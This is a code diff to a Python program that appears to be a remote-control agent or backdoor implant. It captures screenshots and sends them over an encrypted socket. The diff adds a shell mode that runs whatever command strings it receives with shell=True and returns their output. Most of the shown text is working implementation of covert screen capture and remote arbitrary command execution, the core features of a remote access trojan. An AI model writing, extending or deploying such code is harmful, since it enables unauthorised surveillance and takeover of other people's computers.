@@ -72,21 +72,55 @@ def main():
             elif data['type'] == "screenshot":
                 now = datetime.now()
                 date = now.strftime("%d%m_%H%M")
-                filename = f"./screenshot/screen_{date}.png"
+                # filename = f"./screenshot/screen_{date}.png"
+                filename = f"./screenshot/screen_xxx.png"
 
-                screenshot = pyautogui.screenshost()
+                screenshot = pyautogui.screenshot()
                 screenshot.save(filename)
 
                 if not os.path.exists(filename):
+                    print("Screenshot not found")
                     response = json.dumps({
                         'status': 'NOK',
                         'response': 'File not found'
                     }).encode('utf-8')
                 else:
+                    print("Screenshot found")
                     file = open(filename, "rb")
                     response = file.read()
                     file.close()
+                conn.sendall(cipher.encrypt_image(response))
+
+            elif data['type'] == "shell":
+                response = json.dumps({
+                        'status': 'OK',
+                        'response': 'Shell open'
+                }).encode('utf-8')
                 conn.sendall(cipher.encrypt_message(response))
+                while True:
+                    listen = listener.listen()
+                    conn = listen["conn"]
+                    data = cipher.decrypt_message(listen["data"])
+                    data = json.loads(data)
+                    command = data["action"]
+                    print(data)
+                    if command == "" or command.lower() == 'exit':
+                        response = json.dumps({
+                            'status': 'OK',
+                            'response': 'exit' 
+                        }).encode('utf-8')
+                        
+                    else:
+                        # result = subprocess.check_output(command)
+                        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                        response = json.dumps({
+                            'status': 'OK',
+                            'response': result.stdout
+                        }).encode('utf-8')
+
+                    conn.sendall(cipher.encrypt_message(response))
+
+
 
             else:
                 response = json.dumps({
